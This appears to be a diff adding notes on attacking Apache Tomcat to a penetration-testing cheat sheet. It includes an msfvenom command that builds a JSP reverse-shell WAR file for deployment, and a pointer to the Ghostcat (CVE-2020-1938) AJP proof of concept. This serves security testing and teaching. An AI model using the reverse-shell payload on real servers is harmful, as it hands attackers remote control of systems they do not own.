@@ -69,3 +69,15 @@ webapps/customapp
 ```
 > `/WEB-INF/web.xml` : stores info about the routes and classes
 > `/WEB-INF/classes` : could have sensitive information in the classes
+
+## Exploiting WAR files
+The `msfvenom` payload `java/jsp_shell_reverse_tcp` will execute a JSP file. Tomcat automatically extracts WAR file content and deploys it.
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f war > backup.war
+```
+
+## CVE-2020-1938 : Ghostcat
+[Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) affects all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100. [PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).
+
+It relies on the AJP service which is usually on port 8009
